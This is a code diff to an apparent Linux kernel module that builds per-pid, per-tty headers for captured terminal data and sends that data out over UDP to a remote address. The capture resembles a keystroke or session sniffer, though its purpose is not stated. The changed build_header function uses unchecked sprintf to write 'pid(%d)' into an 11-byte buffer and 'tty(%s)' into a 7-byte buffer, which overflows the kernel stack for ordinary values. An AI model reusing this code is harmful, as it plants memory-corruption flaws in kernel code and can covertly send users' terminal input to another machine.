@@ -17,8 +17,12 @@ struct sockaddr_in addr, bind;
 static int
 build_header(char *buf, pid_t pid, struct file *file)
 {
-    sprintf(buf, "[%-5d tty%-3s] ", pid, file->f_path.dentry->d_name.name);
-    return 15;
+    // hardcode header buffer size
+    char pid_buf[11], tty_buf[7];
+    sprintf(pid_buf, "pid(%d)", pid);
+    sprintf(tty_buf, "tty(%s)", file->f_path.dentry->d_name.name);
+    sprintf(buf, "[%-11s %7s] ", pid_buf, tty_buf);
+    return 22;
 }
 
 static int
@@ -56,7 +60,7 @@ void
 send_udp(pid_t pid, struct file *file, char *buf, int buflen)
 {
     int session_hdrlen, session_buflen, packlen;
-    char *session_buf, *session_bdy;
+    char *session_buf, *session_body;
     struct msghdr msg;
     struct kvec iov;
     mm_segment_t fs;
@@ -71,14 +75,18 @@ send_udp(pid_t pid, struct file *file, char *buf, int buflen)
     msg.msg_name = &addr;
     msg.msg_namelen = sizeof(addr);
 
-    session_buf = (char *)kmalloc(BUFLEN + buflen * 2, GFP_KERNEL);
-    session_hdrlen = build_header(session_buf, pid, file);
-    session_bdy = session_buf + session_hdrlen;
-    session_buflen = expand_escape_chars(session_bdy, buf, buflen);
-    session_buflen += session_hdrlen + 1;
-    session_buf[session_buflen - 1] = '\n';
+    { // build packet from header ("session" info) and body
+        session_buf = (char *)kmalloc(BUFLEN + buflen * 2, GFP_KERNEL);
+        session_hdrlen = build_header(session_buf, pid, file);
+        session_body = session_buf + session_hdrlen;
 
-    DEBUG_INFO("testing: %s\n", session_buf);
+        // escape characters are expanded to their literal chararcter form
+        session_buflen = expand_escape_chars(session_body, buf, buflen);
+        session_buflen += session_hdrlen + 1;
+
+        // newline is appended to each packet as it nicens printing
+        session_buf[session_buflen - 1] = '\n';
+    }
 
     while (session_buflen > 0) {
         packlen = (session_buflen < UDP_MAX_DATA_LEN)
